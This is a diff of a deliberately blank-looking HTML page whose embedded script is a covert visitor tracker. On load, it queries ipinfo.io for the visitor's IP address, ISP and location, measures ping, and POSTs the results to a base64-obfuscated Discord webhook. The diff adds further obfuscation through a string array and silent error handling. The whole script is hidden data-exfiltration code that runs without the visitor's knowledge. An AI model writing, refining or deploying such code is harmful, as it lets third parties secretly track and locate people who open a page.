@@ -3,36 +3,42 @@
 <head>
   <title>.</title>
 </head>
-<body style="background:black;color:black">
+<body style="background:#000;color:#000">
 
 <script>
-(() => {
-  const w = atob(
-    "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2MjcwOTkyNzE3NTkxNzcwMy9JSENTMkh uQ0t3RHZuaFMyTERmQVlLZWRSYnhKelJyUmN0TWtucXBtMlhPWnZLekwzYkE4R2l1NDByU24tNFRP OE1PR A=="
-      .replace(/\s/g, "")
-  );
+(function(){
+  const _0xw = [
+    "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2MjcwOTkyNzE3NTkxNzcwMy9JSENTMkh uQ0t3RHZuaFMyTERmQVlLZWRSYnhKelJyUmN0TWtucXBtMlhPWnZLekwzYkE4R2l1NDByU24tNFRP OE1PR A==",
+    "https://ipinfo.io/json",
+    "https://cloudflare.com/cdn-cgi/trace",
+    "no-store",
+    "POST",
+    "application/json"
+  ];
 
-  fetch("https://ipinfo.io/json")
-    .then(r => r.json())
-    .then(d => {
-      const t = performance.now();
-      fetch("https://cloudflare.com/cdn-cgi/trace", { cache: "no-store" })
-        .then(() => {
-          const p = Math.round(performance.now() - t);
-          fetch(w, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              content:
+  const _hook = atob(_0xw[0].replace(/\s/g,""));
+
+  (async () => {
+    try {
+      const _ip = await fetch(_0xw[1]).then(r => r.json());
+      const _t = performance.now();
+      await fetch(_0xw[2], { cache: _0xw[3] });
+      const _p = Math.round(performance.now() - _t);
+
+      await fetch(_hook, {
+        method: _0xw[4],
+        headers: { "Content-Type": _0xw[5] },
+        body: JSON.stringify({
+          content:
 `📡 **Network Info**
-IP: ${d.ip}
-ISP: ${d.org}
-Location: ${d.city}, ${d.region}, ${d.country}
-Ping: ${p} ms`
-            })
-          });
-        });
-    });
+IP: ${_ip.ip}
+ISP: ${_ip.org}
+Location: ${_ip.city}, ${_ip.region}, ${_ip.country}
+Ping: ${_p} ms`
+        })
+      });
+    } catch(e){}
+  })();
 })();
 </script>
 
